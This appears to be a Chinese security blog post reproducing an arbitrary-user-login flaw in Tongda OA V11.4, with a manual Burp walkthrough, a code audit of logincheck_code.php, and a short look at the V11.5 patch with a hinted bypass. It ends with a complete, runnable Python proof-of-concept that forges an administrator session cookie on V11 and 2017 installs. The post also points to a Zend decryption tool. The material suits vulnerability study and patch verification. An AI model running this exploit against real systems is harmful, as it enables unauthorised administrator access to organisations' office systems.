---
title: "通达 OA Office Anywhere V11.4任意用户登录漏洞复现与原理详细解析"
date: 2020-12-13T21:51:03+08:00
cover: https://gitee.com/tutucoo/images/raw/master/uPic/otI1Ic.jpg
---


## 1. 漏洞描述

通达OA系统采用领先的B/S(浏览器/服务器)操作方式，使得网络办公不受地域限制。
Office Anywhere采用基于WEB的企业计算，主HTTP服务器采用了世界上最先进的
Apache服务器，性能稳定可靠。数据存取集中控制，避免了数据泄漏的可能。提供数据备份工具，保护系统数据安全。多级的权限控制，完善的密码验证与登录验证机制更加强了系统安全性。


通达OA官方更新了V11版本安全补丁，修复了任意用户伪造登录漏洞，该漏洞的操作难度低，危害程度大。未经授权的攻击者通过构造请求包实现用户登录，又由于UID是主键且步进为1递增，从而导致可以指定UID实现任意用户登录（admin的缺省UID为1）。


## 2. 漏洞环境
**官网**：https://www.tongda2000.com/

**下载**：https://cdndown.tongda2000.com/oa/2019/TDOA11.4.exe

**版本**：通达OA V11.X<V11.5

**测试系统**：
Windows 7 专业版 64位操作系统
macOS11.0.1
python3.7.5
## 3. 漏洞验证
* 下载并执行poc

  进入这个地址下载poc:https://github.com/NS-Sp4ce/TongDaOA-Fake-User
  执行poc，poc如果顺利执行会返回cookie
   ![](https://gitee.com/tutucoo/images/raw/master/uPic/20201205132816162_824661327.png)

* 任意用户登录

  打开burp，开启代理，访问http://192.168.3.104/general/index.php?isIE=0&modify_pwd=0，替换cookie中的PHPSESSID参数为POC脚本运行获取的sessionid，然后放包
     ![](https://gitee.com/tutucoo/images/raw/master/uPic/20201205132835095_223465151.png)

* 切换到浏览器，可以看到已经使用系统管理员身份登录了后台
   ![](https://gitee.com/tutucoo/images/raw/master/uPic/20201205133237726_1977377901.png)

## 4. 漏洞原理

POC的主要流程:
1. 首先会发送一条GET请求到/general/login_code.php，在其响应包中获取到其中的一串codeuid
2. 发送一条POST请求到/logincheck_code.php，在其请求体中添加上一步获取到的codeuid以及uid=1，这里uid=1代表的是管理员权限，发送成功后会在其响应包中获取Cookie值，经过测试，使用app扫描登录时可以捕获到这条包
3. 最后发送一条GET请求到/general/index.php，Cookie修改为上一步获取到的cookie值，然后就可以成功伪造身份并以管理员身份进入后台
POC核心代码如下：
```python

USER_AGENTS = [
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    ...
]

headers={}

def getV11Session(url):
    checkUrl = url+'/general/login_code.php' 
    try:
        headers["User-Agent"] = choice(USER_AGENTS) #随机挑选列表中的UserAgent
        res = requests.get(checkUrl,headers=headers) #通过组合checkUrl和UserAgent，发起一个get请求
        resText = str(res.text).split('{') #分解请求的返回包，以{为界限
        codeUid = resText[-1].replace('}"}', '').replace('\r\n', '') #获取返回包中的一串codeuid
        getSessUrl = url+'/logincheck_code.php'
        #通过得到的的codeuid和uid，发送一个post请求到logincheck_code.php
        res = requests.post(
            getSessUrl, data={'CODEUID': '{'+codeUid+'}', 'UID': int(1)},headers=headers)
        tmp_cookie = res.headers['Set-Cookie']#该POST请求返回了设置cookie的请求
        headers["User-Agent"] = choice(USER_AGENTS) #重新选择一个UserAgent
        headers["Cookie"] = tmp_cookie #设置新的cookie
        #最后通过拼接UserAgent以及Cookie发送一个get请求到general/index.php
        check_available = requests.get(url + '/general/index.php',headers=headers)
        if '用户未登录' not in check_available.text:# 返回包如果不包含“用户未登录”这样的字眼表示登录成功
            if '重新登录' not in check_available.text:
                print('[+]Get Available COOKIE:' + tmp_cookie)
        else:
            print('[-]Something Wrong With ' + url + ',Maybe Not Vulnerable.')
    except:
        print('[-]Something Wrong With '+url)


```

接下来，演示一下手动获取cookie，并实现任意用户登录
burp拦截打开，直接访问/general/login_code.php，拦截返回包，在返回包中可以看到返回的codeuid，保存起来，后面要用
![](https://gitee.com/tutucoo/images/raw/master/uPic/20201206130617360_586178304.png)
接着访问/logincheck_code.php，删去Cookie，data部分修改为CODEUID={xxx}&UID=1，这里codeuid要填写上一步获取到的codeuid，如下图所示：

![](https://gitee.com/tutucoo/images/raw/master/uPic/20201206131513403_553316630.png)
如果请求参数正确，返回包里的msg字段为空，否则会提示“参数不正确”，此时保存Set-Cookie里面的值，后面要用
![](https://gitee.com/tutucoo/images/raw/master/uPic/20201206131334282_1214772437.png)
最后访问/general/index.php，修改Cookie为上一步Set-Cookie的值1rp2qql0p3uloi87o7ogua6g32，点击forward获取到返回包，可以后台中包含的字眼了，如果请求失败，会返回“用户未登录”

![](https://gitee.com/tutucoo/images/raw/master/uPic/20201206132533523_740749525.png)
放出这条包，跳转到浏览器就可以直接进入后台了
![](https://gitee.com/tutucoo/images/raw/master/uPic/20201206133401538_814565016.png)



再通过源码了解下引起漏洞的原因是什么，所在php文件是logincheck_code.php，根据访问地址，可知logincheck_code.php在根目录下，找到该文件打开
![](https://gitee.com/tutucoo/images/raw/master/uPic/20201206201705889_1081135224.png)
直接打开文件看源码，乱码，显然是加密，通过文件头的标识Zend可知，加密方式为Zend加密
![](https://gitee.com/tutucoo/images/raw/master/uPic/20201206201807907_780572501.png)
不过Zend加密已经有相关的解密的工具，这里提供下载：
https://pan.baidu.com/s/1OdV5YxmNarmCVMZWYy4AuQ 
提取码：hw7o 
工具使用方法也是傻瓜式的，很容易使用，这里就不进行演示了。
解密后可以看到文件内部的代码了，下面进行代码审计
可以看到logincheck_code.php的UID参数是可控的
![](https://gitee.com/tutucoo/images/raw/master/uPic/20201206222103129_104424784.png)
最重要的部分如下，系统通过获取到UID，再存储到session中，上面可以通过POST参数控制UID输入，有了可控输入和缓存，这就满足了用户伪造的两个重要的条件
![](https://gitee.com/tutucoo/images/raw/master/uPic/20201206222425782_573205089.png)
那么请求中为什么还需要CODEUID参数呢？翻一下文件可以看到有个if判断，如果login_codeuid为空就会提示“参数错误！”，而login_codeuid来自于get_cache，也就是说要获取CODEUID需要先设置cache，这样才能获得CODEUID。
![](https://gitee.com/tutucoo/images/raw/master/uPic/20201206224536532_246290381.png)
这个值应该也是由服务端返回，在源码中进行搜索，可以看到很多的结果，可以看到login_code.php（general/login_code和ispirit/login_code均可返回CODEUID），而POC中第一个发起的请求就是发往login_code.php，可见第一个请求的目的就是通过这个请求获取到CODEUID了

![](https://gitee.com/tutucoo/images/raw/master/uPic/20201206230341634_1201445698.png)
它是如何返回CODEUID的呢？我们以ispirit文件夹下的login_code.php为例进行查看
它会从参数codeuid获取值，如果没有传递codeuid，就会随机生成一个codeuid，最后通过echo显示，也就是说直接访问这个地址，就可以查看到codeuid了
![](https://gitee.com/tutucoo/images/raw/master/uPic/20201206231302417_1479707479.png)
login_code在ispirit文件夹下，直接访问，果然返回了codeuid
![](https://gitee.com/tutucoo/images/raw/master/uPic/20201206230910699_2056597192.png)
（另外一个文件general/login_code是通过返回二维码的形式将CODEUID返回的。）
这样，我们就得到了codeuid，现在就可以发送POST请求到logincheck_code了，通过它的响应包获取到了cookie，由于请求中的UID的值是1，也就是管理员，在发请求时将未登录cookie删除，服务端就会返回一个管理员的cookie了，这样再通过访问/general/index.php，也就是后台的首页地址，就可以实现任意用户登录了。
那么如何知道user=1就是管理员呢？
通达本地部署了一个mysql数据库，通过访问数据库就可以知道uid的存储情况
进入通达OA根目录，在mysql5目录下找到my.ini，里面有密码
![](https://gitee.com/tutucoo/images/raw/master/uPic/20201206231929803_1582967293.png)
进入bin文件夹下，右键打开控制台输入命令登录数据库

![](https://gitee.com/tutucoo/images/raw/master/uPic/20201206232404664_910952605.png)
![](https://gitee.com/tutucoo/images/raw/master/uPic/20201206232437982_969512772.png)
查询数据库，可以看到uid=1的用户是admin
![](https://gitee.com/tutucoo/images/raw/master/uPic/20201206232557583_1642729215.png)

## 4. 补丁分析

分析v11.5版本的源码，找到logincheck_code.php，可以看到不再接收UID参数了，而是转为接收TOKEN，然后把token作为key获取值，再对这个值进行解密，最后从解密后的数据中取出UID，解决了UID可控的问题，但是可以通过找到一处设置OA:authcode:token:的地方，或者找到一个可以控制键值的缓存，即可绕过

![image-20201219213424781](https://gitee.com/tutucoo/images/raw/master/uPic/image-20201219213424781.png)

## 5. 总结

通达OA任意用户登录（伪造）是一个比较典型的任意用户登录漏洞，因此作为学习这类漏洞的案例还是比较有代表性的。
漏洞利用过程也比较简单，需要关注的是，在具备了可控输入参数UID和UID缓存到session中这两个条件时，就可能存在任意用户伪造漏洞了，再通过代码审计可知，需要codeuid的值，通过代码引用回溯，定位到获取codeuid的方法，最后通过发起存在漏洞点的请求获取到管理员cookie，然后在未登录的情况下访问后台时带上这个cookie，就可以实现以管理员的身份登录了，如果uid递增，也就是系统中存在的其他用户，也就实现了任意用户登录了。

## 附：POC
```python
'''
@Author         : Sp4ce
@Date           : 2020-03-17 23:42:16
LastEditors    : Sp4ce
LastEditTime   : 2020-08-27 10:21:44
@Description    : Challenge Everything.
'''
import requests
from random import choice
import argparse
import json

USER_AGENTS = [
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)",
    "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
    "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
    "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)",
    "Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0",
    "Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5",
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20",
    "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1",
    "Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
    "Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10"
]

headers={}

def getV11Session(url):
    checkUrl = url+'/general/login_code.php'
    try:
        headers["User-Agent"] = choice(USER_AGENTS)
        res = requests.get(checkUrl,headers=headers)
        resText = str(res.text).split('{')
        codeUid = resText[-1].replace('}"}', '').replace('\r\n', '')
        getSessUrl = url+'/logincheck_code.php'
        res = requests.post(
            getSessUrl, data={'CODEUID': '{'+codeUid+'}', 'UID': int(1)},headers=headers)
        tmp_cookie = res.headers['Set-Cookie']
        headers["User-Agent"] = choice(USER_AGENTS)
        headers["Cookie"] = tmp_cookie
        check_available = requests.get(url + '/general/index.php',headers=headers)
        if '用户未登录' not in check_available.text:
            if '重新登录' not in check_available.text:
                print('[+]Get Available COOKIE:' + tmp_cookie)
        else:
            print('[-]Something Wrong With ' + url + ',Maybe Not Vulnerable.')
    except:
        print('[-]Something Wrong With '+url)



def get2017Session(url):
    checkUrl = url+'/ispirit/login_code.php'
    try:
        headers["User-Agent"] = choice(USER_AGENTS)
        res = requests.get(checkUrl,headers=headers)
        resText = json.loads(res.text)
        codeUid = resText['codeuid']
        codeScanUrl = url+'/general/login_code_scan.php'
        res = requests.post(codeScanUrl, data={'codeuid': codeUid, 'uid': int(
            1), 'source': 'pc', 'type': 'confirm', 'username': 'admin'},headers=headers)
        resText = json.loads(res.text)
        status = resText['status']
        if status == str(1):
            getCodeUidUrl = url+'/ispirit/login_code_check.php?codeuid='+codeUid
            res = requests.get(getCodeUidUrl)
            tmp_cookie = res.headers['Set-Cookie']
            headers["User-Agent"] = choice(USER_AGENTS)
            headers["Cookie"] = tmp_cookie
            check_available = requests.get(url + '/general/index.php',headers=headers)
            if '用户未登录' not in check_available.text:
                if '重新登录' not in check_available.text:
                    print('[+]Get Available COOKIE:' + tmp_cookie)
            else:
                print('[-]Something Wrong With ' + url + ',Maybe Not Vulnerable.')
        else:
            print('[-]Something Wrong With '+url  + ' Maybe Not Vulnerable ?')
    except:
        print('[-]Something Wrong With '+url)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-v",
        "--tdoaversion",
        type=int,
        choices=[11, 2017],
        help="Target TongDa OA Version. e.g: -v 11、-v 2017")
    parser.add_argument(
        "-url",
        "--targeturl",
        type=str,
        help="Target URL. e.g: -url 192.168.2.1、-url http://192.168.2.1"
    )
    args = parser.parse_args()
    url = args.targeturl
    if 'http://' not in url:
        url = 'http://' + url
    if args.tdoaversion == 11:
        getV11Session(url)
    elif args.tdoaversion == 2017:
        get2017Session(url)
    else:
        parser.print_help()
```